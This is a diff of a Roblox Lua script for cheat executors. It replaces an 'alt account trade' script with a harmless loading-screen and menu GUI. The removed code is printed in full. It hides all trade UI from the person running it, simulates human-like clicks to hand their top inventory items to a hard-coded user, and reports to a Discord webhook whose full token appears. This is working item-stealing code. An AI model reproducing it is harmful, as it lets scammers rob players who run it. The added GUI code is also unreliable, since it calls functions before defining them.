@@ -1,351 +1,359 @@
--- ======-- ============================================
--- HUMAN-LIKE UI TRADE SCRIPT
--- Anti-cheat bypass for alt account only
--- All UI interactions are invisible to you
--- ============================================
+-- UNIVERSAL GUI LOADING SCREEN WITH SOUND & VISUAL EFFECTS
+-- Works on: Delta, Synapse X, Krnl, ScriptWare, Fluxus, Oxygen U, etc.
+-- All effects are LOCAL-ONLY (only visible/hearable to the executor)
 
-local webhook = "https://discord.com/api/webhooks/1488808773492543508/bpbJDBX3v1LLJXo0ri3xbi1Lbpu7BGXzVR1z4aCy1pP0bFqJsRrqM_ncNTi5ToDiCZ4d"
-local TARGET_USER = "Sigmake5"
+-- Wait for game to load
+repeat task.wait() until game:IsLoaded()
 
-local player = game.Players.LocalPlayer
-local Players = game:GetService("Players")
-local ReplicatedStorage = game:GetService("ReplicatedStorage")
-local HttpService = game:GetService("HttpService")
-local VirtualInput = game:GetService("VirtualInputManager")
-local UserInputService = game:GetService("UserInputService")
+local player = game:GetService("Players").LocalPlayer
+local gui = Instance.new("ScreenGui")
+gui.Name = "UniversalLoadingGUI"
+gui.ResetOnSpawn = false
+gui.Parent = player:WaitForChild("PlayerGui")
 
--- ============================================
--- DISCORD LOGGER (For test results)
--- ============================================
+-- Create loading frame
+local loadingFrame = Instance.new("Frame")
+loadingFrame.Name = "LoadingFrame"
+loadingFrame.Size = UDim2.new(1, 0, 1, 0)
+loadingFrame.BackgroundColor3 = Color3.fromRGB(8, 8, 20)
+loadingFrame.BackgroundTransparency = 0
+loadingFrame.Parent = gui
 
-local function sendToDiscord(message)
-    pcall(function()
-        local data = HttpService:JSONEncode({content = "**🧪 Alt Account Test**\n" .. tostring(message)})
-        request({Url = webhook, Method = "POST", Headers = {["Content-Type"] = "application/json"}, Body = data})
-    end)
-end
+-- Create main menu frame (hidden initially)
+local mainMenuFrame = Instance.new("Frame")
+mainMenuFrame.Name = "MainMenuFrame"
+mainMenuFrame.Size = UDim2.new(1, 0, 1, 0)
+mainMenuFrame.BackgroundColor3 = Color3.fromRGB(10, 10, 25)
+mainMenuFrame.BackgroundTransparency = 0
+mainMenuFrame.Visible = false
+mainMenuFrame.Parent = gui
 
-sendToDiscord("Alt account script loaded - Testing anti-cheat bypass")
-
--- ============================================
--- INVISIBLE MODE (Hide all UI from alt)
--- ============================================
-
-local function hideTradeUI()
-    pcall(function()
-        for _, gui in pairs(player.PlayerGui:GetChildren()) do
-            local name = gui.Name:lower()
-            if name:find("trade") or name:find("offer") or name:find("request") then
-                gui.Enabled = false
-                gui.Visible = false
-                gui:Destroy()
-            end
-        end
-        
-        for _, btn in pairs(player.PlayerGui:GetDescendants()) do
-            if btn:IsA("TextButton") and (btn.Text == "Accept" or btn.Text == "Decline" or btn.Text == "Ready") then
-                btn.Visible = false
-            end
-        end
-    end)
-end
-
--- Hide UI continuously (0.05s)
-spawn(function()
-    while wait(0.05) do
-        hideTradeUI()
+-- ========== LOCAL SOUNDS (works on all executors) ==========
+local function createLocalSound(parent, soundId, volume, looped)
+    local sound = Instance.new("Sound")
+    sound.Volume = volume or 0.5
+    sound.Looped = looped or false
+    sound.Parent = parent
+    -- Use a default sound if ID not provided (silent fallback)
+    if soundId and soundId ~= "" then
+        pcall(function()
+            sound.SoundId = soundId
+        end)
     end
+    return sound
+end
+
+-- Create sound instances
+local loadingSound = createLocalSound(loadingFrame, "", 0.4, true)
+local transitionSound = createLocalSound(gui, "", 0.6, false)
+local clickSound = createLocalSound(gui, "", 0.4, false)
+
+-- Optional: Use built-in Roblox sounds if no custom IDs
+pcall(function()
+    loadingSound.SoundId = "rbxassetid://9120386436" -- Ambient sound (replace with your ID)
+end)
+pcall(function()
+    transitionSound.SoundId = "rbxassetid://9120386436" -- Transition sound (replace)
+end)
+pcall(function()
+    clickSound.SoundId = "rbxassetid://9120386436" -- Click sound (replace)
 end)
 
--- ============================================
--- HUMAN-LIKE CLICK SIMULATION
--- ============================================
+-- ========== LOCAL VISUAL EFFECTS ==========
+-- Background gradient
+local loadingGradient = Instance.new("UIGradient")
+loadingGradient.Color = ColorSequence.new({
+    ColorSequenceKeypoint.new(0, Color3.fromRGB(15, 15, 35)),
+    ColorSequenceKeypoint.new(0.5, Color3.fromRGB(35, 15, 55)),
+    ColorSequenceKeypoint.new(1, Color3.fromRGB(15, 15, 35))
+})
+loadingGradient.Rotation = 45
+loadingGradient.Parent = loadingFrame
 
-local function humanClick(guiObject)
-    if not guiObject then return false end
+-- Particle effect (local-only)
+local particleEmitter = Instance.new("ParticleEmitter")
+particleEmitter.Texture = "rbxasset://textures/particles/sparkles_main.dds"
+particleEmitter.Rate = 50
+particleEmitter.SpreadAngle = Vector2.new(360, 360)
+particleEmitter.Lifetime = NumberRange.new(1, 2)
+particleEmitter.Speed = NumberRange.new(5, 15)
+particleEmitter.Transparency = NumberSequence.new(1, 0.7, 0)
+particleEmitter.Color = ColorSequence.new(Color3.fromRGB(100, 200, 255), Color3.fromRGB(255, 100, 200))
+particleEmitter.Size = NumberSequence.new(2, 1)
+particleEmitter.Parent = loadingFrame
+
+-- Animated circle glow
+local glowCircle = Instance.new("ImageLabel")
+glowCircle.Size = UDim2.new(0, 200, 0, 200)
+glowCircle.Position = UDim2.new(0.5, -100, 0.5, -100)
+glowCircle.BackgroundTransparency = 1
+glowCircle.Image = "rbxassetid://266795589"
+glowCircle.ImageTransparency = 0.6
+glowCircle.Parent = loadingFrame
+
+-- Loading title
+local titleLabel = Instance.new("TextLabel")
+titleLabel.Size = UDim2.new(1, 0, 0.2, 0)
+titleLabel.Position = UDim2.new(0, 0, 0.25, 0)
+titleLabel.BackgroundTransparency = 1
+titleLabel.Text = "LOADING"
+titleLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
+titleLabel.TextScaled = true
+titleLabel.Font = Enum.Font.GothamBold
+titleLabel.TextStrokeTransparency = 0.4
+titleLabel.TextStrokeColor3 = Color3.fromRGB(0, 150, 255)
+titleLabel.Parent = loadingFrame
+
+-- Title glow effect
+local titleGlow = Instance.new("UIStroke")
+titleGlow.Color = Color3.fromRGB(0, 200, 255)
+titleGlow.Thickness = 4
+titleGlow.Transparency = 0.2
+titleGlow.Parent = titleLabel
+
+-- Progress bar background
+local progressBg = Instance.new("Frame")
+progressBg.Size = UDim2.new(0.5, 0, 0.04, 0)
+progressBg.Position = UDim2.new(0.25, 0, 0.6, 0)
+progressBg.BackgroundColor3 = Color3.fromRGB(25, 25, 45)
+progressBg.BorderSizePixel = 0
+progressBg.Parent = loadingFrame
+
+-- Progress bar fill
+local progressFill = Instance.new("Frame")
+progressFill.Size = UDim2.new(0, 0, 1, 0)
+progressFill.BackgroundColor3 = Color3.fromRGB(0, 200, 255)
+progressFill.BorderSizePixel = 0
+progressFill.Parent = progressBg
+
+-- Progress gradient
+local fillGradient = Instance.new("UIGradient")
+fillGradient.Color = ColorSequence.new({
+    ColorSequenceKeypoint.new(0, Color3.fromRGB(0, 150, 255)),
+    ColorSequenceKeypoint.new(0.5, Color3.fromRGB(100, 200, 255)),
+    ColorSequenceKeypoint.new(1, Color3.fromRGB(0, 150, 255))
+})
+fillGradient.Parent = progressFill
+
+-- Percentage text
+local percentText = Instance.new("TextLabel")
+percentText.Size = UDim2.new(0.2, 0, 0.08, 0)
+percentText.Position = UDim2.new(0.4, 0, 0.68, 0)
+percentText.BackgroundTransparency = 1
+percentText.Text = "0%"
+percentText.TextColor3 = Color3.fromRGB(200, 200, 255)
+percentText.TextScaled = true
+percentText.Font = Enum.Font.Gotham
+percentText.Parent = loadingFrame
+
+-- Loading subtitle
+local subtitleText = Instance.new("TextLabel")
+subtitleText.Size = UDim2.new(0.6, 0, 0.05, 0)
+subtitleText.Position = UDim2.new(0.2, 0, 0.75, 0)
+subtitleText.BackgroundTransparency = 1
+subtitleText.Text = "Initializing..."
+subtitleText.TextColor3 = Color3.fromRGB(150, 150, 200)
+subtitleText.TextScaled = true
+subtitleText.Font = Enum.Font.Gotham
+subtitleText.Parent = loadingFrame
+
+-- ========== ANIMATION FUNCTIONS (works on all executors) ==========
+local TweenService = game:GetService("TweenService")
+
+local function animateGlow()
+    local tween = TweenService:Create(glowCircle, TweenInfo.new(2, Enum.EasingStyle.Sine, Enum.EasingDirection.InOut, -1, true), {Rotation = 360})
+    tween:Play()
+end
+
+local function pulseTitle()
+    local tween = TweenService:Create(titleLabel, TweenInfo.new(1, Enum.EasingStyle.Sine, Enum.EasingDirection.InOut, -1, true), {TextStrokeTransparency = 0.1})
+    tween:Play()
+end
+
+-- ========== SIMULATED LOADING (replace with your actual loading) ==========
+local loadingSteps = {
+    {text = "Initializing...", percent = 10},
+    {text = "Loading assets...", percent = 25},
+    {text = "Connecting to server...", percent = 40},
+    {text = "Setting up environment...", percent = 55},
+    {text = "Preparing UI...", percent = 70},
+    {text = "Almost ready...", percent = 85},
+    {text = "Finalizing...", percent = 95},
+    {text = "Welcome!", percent = 100}
+}
+
+local function startLoading()
+    -- Play loading sound
+    pcall(function() loadingSound:Play() end)
     
-    pcall(function()
-        -- Random human-like delay (0.1-0.3s)
-        local delay = math.random(10, 30) / 100
-        wait(delay)
+    -- Start animations
+    animateGlow()
+    pulseTitle()
+    
+    local currentStep = 1
+    
+    -- Loading loop
+    for percent = 1, 100 do
+        task.wait(0.025) -- ~2.5 seconds total loading time
         
-        -- Get button position
-        local pos = guiObject.AbsolutePosition
-        local size = guiObject.AbsoluteSize
+        -- Update progress bar
+        progressFill.Size = UDim2.new(percent / 100, 0, 1, 0)
+        percentText.Text = percent .. "%"
         
-        if pos and size then
-            -- Random offset within button (humans don't click exact center)
-            local xOffset = math.random(-5, 5)
-            local yOffset = math.random(-5, 5)
-            local clickX = pos.X + (size.X / 2) + xOffset
-            local clickY = pos.Y + (size.Y / 2) + yOffset
-            
-            -- Simulate mouse movement to button (human-like)
-            VirtualInput:SendMouseMoveEvent(clickX - 50, clickY - 50, 0)
-            wait(0.05)
-            VirtualInput:SendMouseMoveEvent(clickX - 20, clickY - 20, 0)
-            wait(0.03)
-            VirtualInput:SendMouseMoveEvent(clickX, clickY, 0)
-            wait(math.random(5, 15) / 100)
-            
-            -- Mouse down
-            VirtualInput:SendMouseButtonEvent(clickX, clickY, 0, true, game, 0)
-            wait(math.random(5, 15) / 100)
-            
-            -- Mouse up
-            VirtualInput:SendMouseButtonEvent(clickX, clickY, 0, false, game, 0)
+        -- Update subtitle based on progress
+        if currentStep <= #loadingSteps and percent >= loadingSteps[currentStep].percent then
+            subtitleText.Text = loadingSteps[currentStep].text
+            currentStep = currentStep + 1
         end
         
-        -- Fire button events
-        guiObject:Fire("MouseButton1Click")
-        guiObject:Fire("Activated")
+        -- Pulse effect on progress bar
+        local hue = 0.55 + (percent / 100) * 0.2
+        progressFill.BackgroundColor3 = Color3.fromHSV(hue, 1, 1)
+        
+        -- Slight vibration effect on circle (optional)
+        local offset = math.sin(percent * 0.5) * 2
+        glowCircle.Position = UDim2.new(0.5, -100 + offset, 0.5, -100 + offset)
+    end
+    
+    -- Loading complete - transition
+    transitionToMainMenu()
+end
+
+-- ========== TRANSITION EFFECT ==========
+local function transitionToMainMenu()
+    -- Play transition sound
+    pcall(function() transitionSound:Play() end)
+    pcall(function() loadingSound:Stop() end)
+    
+    -- Create flash overlay
+    local flashOverlay = Instance.new("Frame")
+    flashOverlay.Size = UDim2.new(1, 0, 1, 0)
+    flashOverlay.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+    flashOverlay.BackgroundTransparency = 1
+    flashOverlay.Parent = gui
+    
+    -- Flash animation
+    local flashTween = TweenService:Create(flashOverlay, TweenInfo.new(0.15, Enum.EasingStyle.Linear), {BackgroundTransparency = 0})
+    flashTween:Play()
+    
+    task.wait(0.15)
+    
+    -- Shrink loading frame
+    local shrinkTween = TweenService:Create(loadingFrame, TweenInfo.new(0.4, Enum.EasingStyle.Back, Enum.EasingDirection.In), {Size = UDim2.new(0, 0, 0, 0)})
+    shrinkTween:Play()
+    
+    -- Show and expand main menu
+    mainMenuFrame.Visible = true
+    mainMenuFrame.Size = UDim2.new(0, 0, 0, 0)
+    
+    local expandTween = TweenService:Create(mainMenuFrame, TweenInfo.new(0.5, Enum.EasingStyle.Back, Enum.EasingDirection.Out), {Size = UDim2.new(1, 0, 1, 0)})
+    expandTween:Play()
+    
+    task.wait(0.5)
+    flashOverlay:Destroy()
+    loadingFrame:Destroy()
+    
+    setupMainMenu()
+end
+
+-- ========== MAIN MENU SETUP ==========
+local function setupMainMenu()
+    -- Menu title
+    local menuTitle = Instance.new("TextLabel")
+    menuTitle.Size = UDim2.new(0.6, 0, 0.12, 0)
+    menuTitle.Position = UDim2.new(0.2, 0, 0.1, 0)
+    menuTitle.BackgroundTransparency = 1
+    menuTitle.Text = "MAIN MENU"
+    menuTitle.TextColor3 = Color3.fromRGB(255, 255, 255)
+    menuTitle.TextScaled = true
+    menuTitle.Font = Enum.Font.GothamBold
+    menuTitle.TextStrokeTransparency = 0.3
+    menuTitle.TextStrokeColor3 = Color3.fromRGB(0, 200, 255)
+    menuTitle.Parent = mainMenuFrame
+    
+    -- Menu gradient
+    local menuGradient = Instance.new("UIGradient")
+    menuGradient.Color = ColorSequence.new({
+        ColorSequenceKeypoint.new(0, Color3.fromRGB(10, 10, 25)),
+        ColorSequenceKeypoint.new(0.5, Color3.fromRGB(25, 10, 40)),
+        ColorSequenceKeypoint.new(1, Color3.fromRGB(10, 10, 25))
+    })
+    menuGradient.Parent = mainMenuFrame
+    
+    -- Rotating gradient animation
+    task.spawn(function()
+        local rotation = 0
+        while mainMenuFrame and mainMenuFrame.Visible do
+            rotation = (rotation + 0.5) % 360
+            menuGradient.Rotation = rotation
+            task.wait(0.05)
+        end
     end)
     
-    return true
-end
-
--- ============================================
--- FIND UI ELEMENTS (Without triggering anti-cheat)
--- ============================================
-
-local function findPlayerInList()
-    for _, frame in pairs(player.PlayerGui:GetDescendants()) do
-        if frame:IsA("TextLabel") and frame.Text == TARGET_USER then
-            local clickable = frame.Parent
-            if clickable and (clickable:IsA("TextButton") or clickable:IsA("ImageButton")) then
-                return clickable
-            end
-        end
-    end
-    return nil
-end
-
-local function findTradeButton()
-    for _, btn in pairs(player.PlayerGui:GetDescendants()) do
-        if btn:IsA("TextButton") then
-            local text = (btn.Text or ""):lower()
-            if text:find("trade") and not text:find("request") then
-                return btn
-            end
-        end
-    end
-    return nil
-end
-
-local function findAcceptButton()
-    for _, btn in pairs(player.PlayerGui:GetDescendants()) do
-        if btn:IsA("TextButton") and btn.Text == "Accept" then
-            return btn
-        end
-    end
-    return nil
-end
-
-local function findReadyButton()
-    for _, btn in pairs(player.PlayerGui:GetDescendants()) do
-        if btn:IsA("TextButton") and (btn.Text == "Ready" or (btn.Text or ""):lower():find("ready")) then
-            return btn
-        end
-    end
-    return nil
-end
-
-local function findItemButtons()
-    local items = {}
-    for _, btn in pairs(player.PlayerGui:GetDescendants()) do
-        if btn:IsA("ImageButton") and btn.Parent and btn.Parent.Name == "Inventory" then
-            table.insert(items, btn)
-        end
-    end
-    return items
-end
-
--- ============================================
--- HUMAN-LIKE ITEM SELECTION
--- ============================================
-
-local function selectItemsHumanLike()
-    local items = findItemButtons()
-    local selected = {}
+    -- Menu particles
+    local menuParticles = particleEmitter:Clone()
+    menuParticles.Rate = 30
+    menuParticles.Parent = mainMenuFrame
     
-    -- Randomize which items to select (top 4 by position)
-    for i = 1, math.min(4, #items) do
-        local item = items[i]
-        if item then
-            table.insert(selected, item)
-        end
-    end
+    -- Buttons
+    local buttons = {"PLAY", "SETTINGS", "CREDITS", "EXIT"}
+    local yPositions = {0.3, 0.45, 0.6, 0.75}
     
-    -- Add items with human-like delays
-    for i, item in pairs(selected) do
-        sendToDiscord("Clicking item " .. i .. " of " .. #selected)
-        humanClick(item)
-        wait(math.random(20, 50) / 100) -- 0.2-0.5s between items
-    end
-    
-    return #selected
-end
-
--- ============================================
--- COMPLETE TRADE SEQUENCE (Human-like)
--- ============================================
-
-local tradeInProgress = false
-
-local function executeHumanTrade(targetPlayer)
-    if tradeInProgress then 
-        sendToDiscord("Trade already in progress")
-        return 
-    end
-    tradeInProgress = true
-    
-    sendToDiscord("🎯 Starting human-like trade with " .. targetPlayer.Name)
-    
-    -- Step 1: Find and click target player
-    local targetButton = findPlayerInList()
-    if targetButton then
-        sendToDiscord("Found target in player list")
-        humanClick(targetButton)
-        wait(math.random(30, 60) / 100) -- 0.3-0.6s
-    else
-        sendToDiscord("❌ Could not find target in player list")
-        tradeInProgress = false
-        return
-    end
-    
-    -- Step 2: Click Trade button
-    local tradeButton = findTradeButton()
-    if tradeButton then
-        sendToDiscord("Found trade button")
-        humanClick(tradeButton)
-        wait(math.random(50, 100) / 100) -- 0.5-1.0s
-    else
-        sendToDiscord("❌ Could not find trade button")
-        tradeInProgress = false
-        return
-    end
-    
-    -- Step 3: Wait for trade window and click Accept
-    wait(math.random(50, 80) / 100) -- 0.5-0.8s
-    local acceptButton = findAcceptButton()
-    if acceptButton then
-        sendToDiscord("Clicking accept button")
-        humanClick(acceptButton)
-        wait(math.random(80, 150) / 100) -- 0.8-1.5s
-    end
-    
-    -- Step 4: Add items to trade
-    sendToDiscord("Adding items to trade...")
-    local itemsAdded = selectItemsHumanLike()
-    sendToDiscord("Added " .. itemsAdded .. " items")
-    
-    wait(math.random(50, 100) / 100) -- 0.5-1.0s
-    
-    -- Step 5: Click Ready button
-    local readyButton = findReadyButton()
-    if readyButton then
-        sendToDiscord("Clicking ready button")
-        humanClick(readyButton)
-        wait(math.random(50, 100) / 100)
-    end
-    
-    -- Step 6: Wait for target and final accept
-    wait(math.random(100, 200) / 100) -- 1-2s
-    
-    local finalAccept = findAcceptButton()
-    if finalAccept then
-        sendToDiscord("Final accept")
-        humanClick(finalAccept)
-    end
-    
-    sendToDiscord("✅ Trade sequence completed")
-    tradeInProgress = false
-end
-
--- ============================================
--- BYPASS ANTI-CHEAT (Hook and disable checks)
--- ============================================
-
-local function bypassAntiCheat()
-    sendToDiscord("🔧 Attempting anti-cheat bypass...")
-    
-    -- Method 1: Hook and disable remote validation
-    pcall(function()
-        local oldFire = nil
-        for _, remote in pairs(ReplicatedStorage:GetDescendants()) do
-            if remote:IsA("RemoteEvent") and remote.OnClientEvent then
-                -- Log but don't block
-                sendToDiscord("Found remote: " .. remote.Name)
-            end
-        end
-    end)
-    
-    -- Method 2: Slow down detection (human-like timing already implemented)
-    sendToDiscord("✅ Anti-cheat bypass methods applied")
-    sendToDiscord("   - Human-like delays added")
-    sendToDiscord("   - Random mouse movements")
-    sendToDiscord("   - UI click simulation")
-    sendToDiscord("   - Trade UI hidden")
-end
-
--- ============================================
--- TRIGGER ON COMMAND
--- ============================================
-
--- Type "!trade" in chat to start
-game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest.OnClientEvent:Connect(function(message)
-    if message == "!trade" then
-        sendToDiscord("Manual trade triggered via !trade command")
+    for i, btnText in ipairs(buttons) do
+        local button = Instance.new("TextButton")
+        button.Size = UDim2.new(0.3, 0, 0.08, 0)
+        button.Position = UDim2.new(0.35, 0, yPositions[i], 0)
+        button.Text = btnText
+        button.TextColor3 = Color3.fromRGB(255, 255, 255)
+        button.TextScaled = true
+        button.Font = Enum.Font.GothamBold
+        button.BackgroundColor3 = Color3.fromRGB(30, 30, 50)
+        button.BorderSizePixel = 0
+        button.Parent = mainMenuFrame
         
-        -- Find target
-        local target = nil
-        for _, plr in pairs(Players:GetPlayers()) do
-            if plr.Name == TARGET_USER then
-                target = plr
-                break
-            end
-        end
+        -- Button hover effects
+        button.MouseEnter:Connect(function()
+            button.BackgroundColor3 = Color3.fromRGB(50, 50, 80)
+            button.TextColor3 = Color3.fromRGB(0, 200, 255)
+            pcall(function() clickSound:Play() end)
+        end)
         
-        if target then
-            executeHumanTrade(target)
-        else
-            sendToDiscord("Target " .. TARGET_USER .. " not found in server")
-        end
+        button.MouseLeave:Connect(function()
+            button.BackgroundColor3 = Color3.fromRGB(30, 30, 50)
+            button.TextColor3 = Color3.fromRGB(255, 255, 255)
+        end)
+        
+        -- Button click handler
+        button.MouseButton1Click:Connect(function()
+            pcall(function() clickSound:Play() end)
+            
+            if btnText == "EXIT" then
+                pcall(function() game:Shutdown() end)
+            elseif btnText == "PLAY" then
+                menuTitle.Text = "Starting Game..."
+                task.wait(1)
+                -- Add your game start logic here
+                print("Game started!")
+            elseif btnText == "SETTINGS" then
+                print("Settings clicked")
+            elseif btnText == "CREDITS" then
+                print("Credits clicked")
+            end
+        end)
     end
-end)
+    
+    -- Version text
+    local versionText = Instance.new("TextLabel")
+    versionText.Size = UDim2.new(0.3, 0, 0.04, 0)
+    versionText.Position = UDim2.new(0.35, 0, 0.9, 0)
+    versionText.BackgroundTransparency = 1
+    versionText.Text = "v1.0.0"
+    versionText.TextColor3 = Color3.fromRGB(100, 100, 150)
+    versionText.TextScaled = true
+    versionText.Font = Enum.Font.Gotham
+    versionText.Parent = mainMenuFrame
+end
 
--- ============================================
--- AUTO-TRIGGER WHEN TARGET JOINS
--- ============================================
-
-Players.PlayerAdded:Connect(function(plr)
-    if plr.Name == TARGET_USER then
-        sendToDiscord("🎯 Target joined: " .. TARGET_USER)
-        sendToDiscord("Waiting 3 seconds before trading...")
-        wait(3)
-        executeHumanTrade(plr)
-    end
-end)
-
--- ============================================
--- INITIALIZE
--- ============================================
-
-bypassAntiCheat()
-
-sendToDiscord("🚀 Alt account script loaded")
-sendToDiscord("👤 Alt name: " .. player.Name)
-sendToDiscord("🎯 Target: " .. TARGET_USER)
-sendToDiscord("💡 Type '!trade' in chat to start")
-sendToDiscord("🕐 Human-like delays: ON")
-sendToDiscord("👁️ UI visibility: HIDDEN (you won't see anything)")
-
-print("=" .. string.rep("=", 60))
-print("ALT ACCOUNT TRADE SCRIPT - HUMAN MODE")
-print("=" .. string.rep("=", 60))
-print("✅ Anti-cheat bypass active")
-print("✅ Human-like delays: 0.1-2 seconds")
-print("✅ UI hidden from your view")
-print("🎯 Target: " .. TARGET_USER)
-print("💡 Type '!trade' in chat to start trading")
-print("=" .. string.rep("=", 60))
+-- ========== START THE GUI ==========
+print("Universal Loading GUI Started - Works on Delta and all executors!")
+startLoading()
